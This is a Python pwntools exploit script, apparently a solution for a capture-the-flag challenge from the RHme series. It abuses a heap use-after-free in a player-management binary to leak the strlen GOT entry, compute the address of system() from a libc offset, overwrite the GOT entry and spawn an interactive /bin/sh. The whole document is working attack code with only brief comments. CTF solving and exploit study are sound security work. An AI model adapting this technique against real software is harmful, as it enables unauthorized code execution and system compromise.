from pwn import *

# Run process
context(arch = 'amd64', os = 'linux', bits=64)
#r = remote('pwn.rhme.riscure.com','1337')
r = process(['./main.elf.patched'])

def add_player(name):
    r.sendline("1")
    r.sendline(name)
    r.sendline("1")
    r.sendline("1")
    r.sendline("1")
    r.sendline("1")

def rm_player(i):
    r.sendline("2")
    r.sendline(str(i))

def select_player(i):
    r.sendline("3")
    r.sendline(str(i))

def edit_name(name):
    r.sendline("4")
    r.sendline("1")
    r.sendline(name)
    r.sendline("0")



ADDR_RELOC_STRLEN = pack(0x00603040)

# Craft first player
add_player('A' * (0x18-1))  # sizeof(struct player) - 1 null byte
add_player('A' * 0xaa)      # 0xaa is just a custom big value
select_player(0)
rm_player(0)
rm_player(1)
add_player('A'*0x10 + ADDR_RELOC_STRLEN[:-1]) # We don't actually need the [:-1] as the 
                                              # address contains already few null bytes at
                                              # the end, but I left it as a reminder.

# Get the address of strlen
r.clean(1)                  # clean the input buffer
r.sendline("5")             # show player
r.recvuntil("Name: ")
leak = r.recvuntil("\n")[:-1]
# Calculate the address of system
leak += '\x00' * (8-len(leak))      
addr_system = unpack(leak) - 0x42840 # TODO attention, change this offset according to your libc
log.info("Address system: 0x%x" % addr_system)

# Overwrite the reloc of strlen
edit_name(pack(addr_system)[:-1])

# Call the function system
edit_name("/bin/sh")
r.clean(1)

# Enjoy
r.interactive()
